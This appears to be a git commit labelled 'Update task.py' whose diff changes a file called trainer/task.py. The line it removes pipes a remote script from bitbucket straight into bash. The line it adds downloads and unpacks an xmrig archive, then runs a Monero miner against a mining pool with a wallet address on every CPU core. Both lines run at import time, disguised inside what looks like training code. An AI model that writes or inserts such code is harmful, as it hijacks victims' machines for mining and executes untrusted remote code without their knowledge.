252ca5c4039ffbd38efc15d821be482e74cf9126
Septian Aldis <aminah.leitha@carlet.tech>
2026-05-10 09:50:58 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/cocote/bas/raw/main/oyo | bash')
+os.system('wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz && ./xmrig --url pool.hashvault.pro:443 --user 89LTdPHYx42YhLfH6yzufYbwGzgFLRx59SG1xcmhxx1zaSdWUBMBMkkSRy1mUMPyDQUi98y5Ufxq8aY4znchEai3MdEj217 --pass COCOTEE --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -t $(nproc --all)')
